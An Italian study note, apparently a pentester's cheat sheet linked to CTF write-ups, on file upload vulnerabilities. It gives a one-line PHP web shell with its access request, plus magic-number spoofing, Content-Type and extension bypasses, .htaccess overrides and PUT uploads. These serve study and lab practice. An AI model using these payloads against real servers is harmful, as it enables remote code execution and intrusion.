#Exploit_noti 

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Upload shell PHP]]
- [[#Magic Number]]
- [[#Bypass Content-Type]]
- [[#Bypass Blacklist]]
- [[#Overwriting Files]]
- [[#Offuscamento estensioni]]
- [[#Metodo PUT]]
- [[#Formati ZIP-based]]

---
---
---
### Introduzione
Le **file upload vulnerabilities** si verificano quando un'applicazione consente all'utente di caricare file sul server senza un‚Äôadeguata validazione. Questo pu√≤ permettere:

- Esecuzione remota di codice (RCE)
- Sovrascrittura file critici
- Denial of Service
- Attacchi client-side come XSS persistente

> [!Attention]
> **In scenari critici:** √® possibile caricare ed eseguire una [[üî° Glossario#Web Shell| web shell]].
> **Esecuzione:** √® importante comprendere quali tipi di linguaggio utilizza la macchina per permettere l'esecuzione del file malevolo (es: PHP, python, ecc)

---
### Upload shell PHP
Esempio di shell PHP:

```
<?php echo system($_GET['cmd']); ?>
```

Accesso:

```
GET /uploads/shell.php?cmd=id
```

üìö‚Äã Writeups:
- *Linux:*[[Linux#ScriptKiddies| ScriptKieddies]],

---
### Magic Number
üîç Alcuni server **verificano il contenuto binario** iniziale del file (i primi byte, detti "Magic Number") per bloccare file non immagini.

**Esempi di Magic Number:**

- `.jpg`: `FF D8 FF`
- `.png`: `89 50 4E 47`
- `.gif`: `47 49 46 38`
- `.bmp`: `42 4D`

Qui una [lista](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) completa dei Magic Numbers.

Utilizza:

```
hexeditor -b shell.php # Aggiungi magic number esadecimale all‚Äôinizio (es: FF D8 FF per JPG)
```

Poi salvalo come `shell.jpg`, intercetti la richiesta e inietti:

```
Content-Type: image/jpeg
√ø√ò√ø<?php system($_GET['cmd']); ?>
```

Il server legge il file come immagine, ma esegue comunque il PHP.

üìö‚Äã Writeups:
- *Linux:*[[Linux#Magic| Magic]],[[Linux#Blogger| Blogger]],[[Linux#Vmdak| Vmdak]],[[Linux#Mzavee| Mzavee]],[[Linux#Networked| Networked]],

---
### Bypass Content-Type
Alcuni server accettano il MIME type dichiarato nel multipart POST come verit√† assoluta:

```
Content-Type: image/jpeg Filename: shell.php
```

Usare **Burp Repeater** per inviare payload con estensione `.php`, MIME finto `image/jpeg`, ma contenuto PHP. 
Rimandiamo a questa [guida]() per approfondimenti su come 

---
### Bypass Blacklist
Molti sviluppatori bloccano solo `.php`, `.jsp`, ecc., ma dimenticano:

- `.php5`, `.php7`, `.phtml`, `.shtml`, `.asp`, 
- Doppie estensioni: `shell.php.jpg`
- Estensioni custom poi mappate via `.htaccess` o `web.config`

---
### Overwriting Files
Caricamento di `.htaccess` con:

```
AddType application/x-httpd-php .jpg
```

Rende `.jpg` eseguibile come PHP.

üìö‚Äã Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Access| Access]],

---
### Offuscamento estensioni
Tecniche comuni:

- Case bypass: `shell.pHp`, `shell.PHP`
- URL encoding: `shell%2ephp`, `shell%252ephp`
- Null byte (dove supportato): `shell.php%00.jpg`
- Padding: `shell.p.phphp`
- Unicode trick: `%c0%ae` ‚Üí `.`

---
### Metodo PUT
Alcuni server supportano il metodo `PUT` permettendo il caricamento di file malevoli:

```
PUT /uploads/shell.php HTTP/1.1 Content-Type: application/x-httpd-php
```

Oppure bypass tramite config locali:
- Apache: `.htaccess`
- IIS: `web.config`

Upload diretto di file `.htaccess` per abilitare interpretazione `.txt` come PHP.

---
### Formati ZIP-based
Molte applicazioni accettano:
- `.zip`, `.rar`, `.7z` (archivi)
- `.odt`, `.docx`, `.xlsx` (OpenXML / LibreOffice)
- `.jar`, `.apk`, `.war` (eseguibili in ambienti Java)

Questi formati **non vengono bloccati** perch√© considerati "documenti" ma alcuni server estraggano automaticamente il contenuto e di conseguenza lo eseguono.

üìö‚Äã Writeups:
- *Linux:*[[Linux#Zipper| Zipper]],
- *Windows:*[[Windows#Craft| Craft]],